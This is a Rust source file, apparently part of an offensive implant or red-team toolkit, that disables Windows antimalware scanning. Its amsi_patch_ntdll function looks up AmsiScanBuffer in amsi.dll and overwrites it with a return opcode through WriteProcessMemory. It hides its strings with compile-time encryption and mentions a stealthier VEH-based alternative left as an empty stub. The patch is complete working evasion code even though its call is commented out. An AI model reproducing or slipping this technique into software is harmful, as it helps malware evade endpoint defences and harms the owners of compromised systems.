use std::ffi::c_void;

use shared_no_std::export_resolver;
use shared_no_std::export_resolver::ExportResolveError;
use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
};

use crate::utils::console::print_info;

/// Patches AMSI in the current process if the AMSI patching feature flag is enabled. This function can
/// be called without checking whether the feature flag is enabled, as the check happens within the
/// function.
pub fn evade_amsi() {
    #[cfg(feature = "patch_amsi")]
    {
        // NOTE: Disabling for now in favour of the possibly more stealthy VEH^2 technique
        // amsi_patch_ntdll();

        return;
    }

    print_info(sc!("WARNING: Not patching AMSI. This could be dangerous.", 49).unwrap());
}

fn amsi_patch_ntdll() {
    use shared_no_std::export_resolver::resolve_address;

    use crate::utils::console::print_info;

    print_info(sc!("Patching amsi..", 49).unwrap());

    let fn_addr = match resolve_address(&sc!("amsi.dll", 42).unwrap(), "AmsiScanBuffer", None) {
        Ok(a) => a,
        Err(_) => {
            #[cfg(debug_assertions)]
            use crate::utils::console::print_failed;

            #[cfg(debug_assertions)]
            print_failed("Failed to find function AmsiScanBuffer..");

            return;
        }
    };

    let handle = unsafe { GetCurrentProcess() };
    let ret_opcode: u8 = 0xC3;

    let size = std::mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let _res = unsafe {
        WriteProcessMemory(
            handle,
            fn_addr,
            &ret_opcode as *const u8 as *const c_void,
            size,
            &mut bytes_written,
        )
    };
}

fn amsi_veh_squared() {}
